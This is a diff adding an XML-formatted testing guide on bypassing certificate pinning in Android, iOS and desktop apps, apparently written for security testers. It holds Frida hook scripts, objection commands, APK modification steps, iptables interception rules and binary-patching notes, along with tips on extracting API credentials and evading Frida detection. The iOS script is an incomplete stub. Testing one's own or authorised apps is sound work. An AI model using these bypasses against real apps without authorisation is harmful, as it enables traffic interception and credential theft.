@@ -1,0 +1,274 @@
+<vulnerability_guide>
+  <title>CERTIFICATE PINNING BYPASS</title>
+
+  <critical>Certificate pinning ties an application to specific certificates or public keys, preventing MITM attacks even with compromised CAs. Bypassing pinning allows traffic interception, credential theft, and API reverse engineering. Mobile apps and thick clients are primary targets.</critical>
+
+  <scope>
+    - Android certificate pinning bypass
+    - iOS certificate pinning bypass
+    - Desktop application bypasses
+    - SSL/TLS interception setup
+    - Frida and hooking techniques
+    - Network Security Config attacks
+  </scope>
+
+  <methodology>
+    1. PINNING DETECTION
+       {% raw %}
+       # Identify if pinning is implemented
+
+       # Quick test:
+       # Set up proxy (Burp, mitmproxy)
+       # Install proxy CA on device
+       # Try to intercept traffic
+
+       # If SSL errors = pinning likely active
+
+       # Android indicators:
+       # - Network Security Config
+       # - OkHttp CertificatePinner
+       # - TrustManager implementation
+
+       # iOS indicators:
+       # - URLSession delegate methods
+       # - AFNetworking/Alamofire pinning
+       # - TrustKit implementation
+       {% endraw %}
+
+    2. ANDROID BYPASS - FRIDA
+       {% raw %}
+       # Frida script for SSL pinning bypass
+
+       # Install Frida
+       pip install frida-tools
+
+       # Push frida-server to device
+       adb push frida-server /data/local/tmp/
+       adb shell "chmod 755 /data/local/tmp/frida-server"
+       adb shell "/data/local/tmp/frida-server &"
+
+       # Universal Android SSL Pinning Bypass
+       frida -U -f com.target.app -l ssl_bypass.js --no-pause
+
+       # ssl_bypass.js (Frida script):
+       Java.perform(function() {
+           // OkHttp bypass
+           var CertificatePinner = Java.use('okhttp3.CertificatePinner');
+           CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
+               console.log('[+] OkHttp CertificatePinner.check bypassed');
+               return;
+           };
+
+           // TrustManager bypass
+           var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
+           TrustManagerImpl.verifyChain.implementation = function() {
+               console.log('[+] TrustManager.verifyChain bypassed');
+               return arguments[0];
+           };
+       });
+       {% endraw %}
+
+    3. ANDROID BYPASS - OBJECTION
+       {% raw %}
+       # Objection for easy bypassing
+
+       # Install objection
+       pip install objection
+
+       # Patch APK with Frida gadget
+       objection patchapk --source app.apk
+
+       # Or inject into running process
+       objection -g com.target.app explore
+
+       # Bypass SSL pinning
+       android sslpinning disable
+
+       # Alternative: Manual APK modification
+       # Decompile with apktool
+       # Remove pinning from smali
+       # Recompile and sign
+       {% endraw %}
+
+    4. IOS BYPASS - FRIDA
+       {% raw %}
+       # iOS SSL pinning bypass with Frida
+
+       # Connect to jailbroken device
+       frida -U -f com.target.app -l ios_ssl_bypass.js --no-pause
+
+       # ios_ssl_bypass.js:
+       var SSLContextClass = ObjC.classes.NSURLSession;
+       Interceptor.attach(ObjC.classes.NSURLSession['- URLSession:didReceiveChallenge:completionHandler:'].implementation, {
+           onEnter: function(args) {
+               // Accept all certificates
+               var challenge = ObjC.Object(args[3]);
+               var completion = new ObjC.Block(args[4]);
+               // Call completion with credential
+           }
+       });
+
+       # Using SSL Kill Switch 2 (Cydia)
+       # Install from Cydia, enable for target app
+
+       # Using Objection
+       objection -g com.target.app explore
+       ios sslpinning disable
+       {% endraw %}
+
+    5. NETWORK SECURITY CONFIG BYPASS
+       {% raw %}
+       # Android 7+ Network Security Config
+
+       # res/xml/network_security_config.xml
+       <network-security-config>
+           <domain-config>
+               <domain includeSubdomains="true">target.com</domain>
+               <pin-set>
+                   <pin digest="SHA-256">base64hash=</pin>
+               </pin-set>
+           </domain-config>
+       </network-security-config>
+
+       # Bypass: Modify APK
+       apktool d app.apk
+       # Edit network_security_config.xml:
+       <network-security-config>
+           <base-config>
+               <trust-anchors>
+                   <certificates src="system"/>
+                   <certificates src="user"/>
+               </trust-anchors>
+           </base-config>
+       </network-security-config>
+
+       apktool b app -o modified.apk
+       # Sign and install
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <dynamic_instrumentation>
+      {% raw %}
+      # Deep hooking for custom implementations
+
+      # Find pinning functions
+      frida-trace -U -f com.app -i "*pin*" -i "*cert*" -i "*ssl*"
+
+      # Custom hook development
+      Java.perform(function() {
+          Java.enumerateLoadedClasses({
+              onMatch: function(className) {
+                  if (className.includes('Pinning') ||
+                      className.includes('Certificate')) {
+                      console.log(className);
+                  }
+              },
+              onComplete: function() {}
+          });
+      });
+      {% endraw %}
+    </dynamic_instrumentation>
+
+    <binary_patching>
+      {% raw %}
+      # Patch binary directly
+
+      # Android: Patch smali/dex
+      # Find certificate check function
+      # Replace with return-void or const/4 v0, 0x1
+
+      # iOS: Patch Mach-O binary
+      # Locate verification function
+      # NOP or patch comparison
+
+      # Tools:
+      # - Ghidra for analysis
+      # - Hopper for iOS
+      # - radare2 for patching
+      {% endraw %}
+    </binary_patching>
+
+    <proxy_configuration>
+      {% raw %}
+      # Advanced proxy setup
+
+      # Invisible proxying (for apps that detect proxy)
+      # Route all traffic through transparent proxy
+      iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8080
+
+      # Split tunneling
+      # Only route target app through proxy
+
+      # VPN-based interception
+      # Create VPN with MITM capability
+
+      # mitmproxy with wireguard
+      # Intercept without device proxy settings
+      {% endraw %}
+    </proxy_configuration>
+
+    <runtime_manipulation>
+      {% raw %}
+      # Manipulate at runtime without recompilation
+
+      # Android: Magisk modules
+      # MagiskTrustUserCerts: Trust user certs system-wide
+      # EdXposed + JustTrustMe
+
+      # iOS: Cydia tweaks
+      # SSL Kill Switch 2
+      # SSLKillSwitch3
+
+      # Desktop apps: DLL injection
+      # Hook SSL verification functions
+      # Return success unconditionally
+      {% endraw %}
+    </runtime_manipulation>
+
+    <certificate_replacement>
+      {% raw %}
+      # Replace pinned certificates
+
+      # If pin is hash-based:
+      # Generate cert with matching hash (collision - unlikely)
+      # Or modify app to accept different hash
+
+      # If pin is certificate-based:
+      # Replace bundled certificate in APK/IPA
+      # Resign package
+
+      # Public key pinning:
+      # Find private key (unlikely)
+      # Or hook key comparison function
+      {% endraw %}
+    </certificate_replacement>
+  </advanced_techniques>
+
+  <detection>
+    - Implement pinning with backup pins
+    - Detect Frida/debugging attempts
+    - Check for app modification (signature verification)
+    - Monitor for unusual traffic patterns
+    - Implement multiple pinning layers
+  </detection>
+
+  <validation>
+    - Successfully intercept pinned traffic
+    - Extract API credentials from traffic
+    - Document bypass method used
+    - Test across app versions
+    - Verify persistence of bypass
+  </validation>
+
+  <pro_tips>
+    - Start with Objection - it handles most common cases automatically
+    - For stubborn apps, trace SSL functions with Frida first
+    - Network Security Config bypass requires APK modification
+    - iOS requires jailbreak or advanced techniques
+    - Some apps detect Frida - use frida-gadget stealth
+    - Check for multiple pinning implementations (library + custom)
+  </pro_tips>
+
+  <remember>Certificate pinning is a defense-in-depth measure, not a security boundary. With physical device access or debug capability, it can always be bypassed. For mobile testing, the question is not "can it be bypassed" but "how quickly." Start with the easiest method (Objection) and escalate to binary patching only if needed.</remember>
+</vulnerability_guide>
